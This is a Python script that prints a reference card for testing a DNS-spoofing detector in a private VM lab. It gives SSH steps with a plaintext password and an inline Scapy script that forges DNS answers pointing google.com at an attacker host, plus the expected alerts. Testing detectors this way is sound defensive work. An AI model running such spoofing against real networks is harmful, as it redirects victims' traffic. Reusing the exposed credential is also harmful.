#!/usr/bin/env python3
"""
QUICK REFERENCE - DNS ATTACK TEST
Paste these commands into terminals
"""

print("""
╔══════════════════════════════════════════════════════════════════════════╗
║                       QUICK REFERENCE CARD                              ║
║                    DNS SPOOFING ATTACK TEST                             ║
╚══════════════════════════════════════════════════════════════════════════╝

┌─────────────────────────────────────────────────────────────────────────┐
│ TERMINAL 1: Start Monitor System (ssh into Monitor VM)                   │
└─────────────────────────────────────────────────────────────────────────┘

ssh monitor@192.168.128.8
Password: achu2006

cd ~/securenet

sudo pkill -f "python3.*production_main" 2>/dev/null || true
sleep 2

sudo python3 production_main.py \\
  --interactive \\
  --interface enp0s1 \\
  --config production_config.yaml \\
  --log-level INFO

[KEEP THIS RUNNING - Shows "Monitoring active..."]

┌─────────────────────────────────────────────────────────────────────────┐
│ TERMINAL 2: Watch Logs (new ssh session to Monitor VM)                   │
└─────────────────────────────────────────────────────────────────────────┘

ssh monitor@192.168.128.8
Password: achu2006

cd ~/securenet

sudo tail -f production_security.log | grep -i "dns\\|alert"

[WATCH FOR: "ATTACK DETECTED: DNS_SPOOFING"]

┌─────────────────────────────────────────────────────────────────────────┐
│ TERMINAL 3: Run DNS Attack (Attacker VM or inline)                       │
└─────────────────────────────────────────────────────────────────────────┘

Option A - From Attacker VM (if SSH available):

ssh attacker@192.168.128.101
cd ~/securenet
python3 run_dns_attack.py

Option B - Inline attack (no file needed):

python3 << 'ATTACK'
from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, sendp
import random, time

iface = "eth0"  # Change to enp0s1 if needed
attacker = "192.168.128.101"
victim = "192.168.128.6"

print("🔥 DNS SPOOFING ATTACK - SENDING 50 PACKETS")
for i in range(50):
    pkt = IP(src=attacker, dst=victim) / \\
          UDP(sport=53, dport=random.randint(10000,60000)) / \\
          DNS(id=random.randint(0,65535), qr=1, rd=1, ra=1,
              qd=DNSQR(qname="google.com"),
              an=DNSRR(rrname="google.com", ttl=10, rdata=attacker))
    sendp(pkt, iface=iface, verbose=False)
    time.sleep(0.1)
    if (i+1) % 10 == 0:
        print(f"  {i+1} packets sent...")

print("✅ Attack complete!")
ATTACK

┌─────────────────────────────────────────────────────────────────────────┐
│ EXPECTED RESULTS (in Terminal 2, within 5-30 seconds)                   │
└─────────────────────────────────────────────────────────────────────────┘

2026-01-19 21:15:45 - SECURITY ALERT - CRITICAL - ATTACK DETECTED: DNS_SPOOFING
2026-01-19 21:15:45 - Source IP: 192.168.128.101
2026-01-19 21:15:45 - Confidence: 0.75
2026-01-19 21:15:45 - Detection Method: ANOMALY_BASED
2026-01-19 21:15:45 - Executing production mitigation for dns_spoofing

[IF YOU SEE THIS: ✅ DNS DETECTION IS WORKING!]

┌─────────────────────────────────────────────────────────────────────────┐
│ TROUBLESHOOTING                                                          │
└─────────────────────────────────────────────────────────────────────────┘

❌ No alert after attack?
├─ Check: Is Monitor system running? (Terminal 1 should show "Monitoring active")
├─ Check: Interface correct? (sudo ip link show | grep enp0s1)
├─ Check: Baseline initialized? (grep baseline ~/securenet/production_security.log)
└─ Solution: Restart Monitor system and try again

❌ "Interface eth0 not found"?
├─ Check: ip link show
├─ Try: eth0, enp0s1, ens3, ens33, enp0s3
└─ Update iface variable in attack script

❌ "Scapy not found"?
└─ Run: pip3 install scapy

┌─────────────────────────────────────────────────────────────────────────┐
│ VERIFICATION CHECKS                                                      │
└─────────────────────────────────────────────────────────────────────────┘

1. Confirm baseline initialized:
   grep "Detector baselines initialized" ~/securenet/production_security.log

2. Verify attack packets reached Monitor:
   sudo tcpdump -i enp0s1 'port 53' -n -c 10

3. Check JSON security events:
   tail -f ~/securenet/security_events.jsonl | jq '.attack_type'

4. Monitor system health:
   python3 production_main.py --status --interface enp0s1

┌─────────────────────────────────────────────────────────────────────────┐
│ KEY DETAILS                                                              │
└─────────────────────────────────────────────────────────────────────────┘

Attack Parameters:
  • TTL: 10 seconds (spoofed)
  • Baseline: 3600 seconds (expected)
  • Variance: 3590 seconds
  • Threshold: 600 seconds
  • Trigger: variance > threshold ✓

Detection:
  • Method: ANOMALY_BASED (TTL variance)
  • Confidence: 0.70-0.85 (75-85%)
  • Latency: 5-30 seconds
  • Type: DNS_SPOOFING

Baseline Data:
  • google.com → 8.8.8.8
  • cloudflare.com → 1.1.1.1
  • dns.google → 8.8.8.8
  • dns.cloudflare.com → 1.1.1.1
  • opendns.com → 208.67.222.222

═══════════════════════════════════════════════════════════════════════════

CTRL+C to stop any process (Terminal 1 & 2)
Attack runs automatically (Terminal 3)

═══════════════════════════════════════════════════════════════════════════
""")
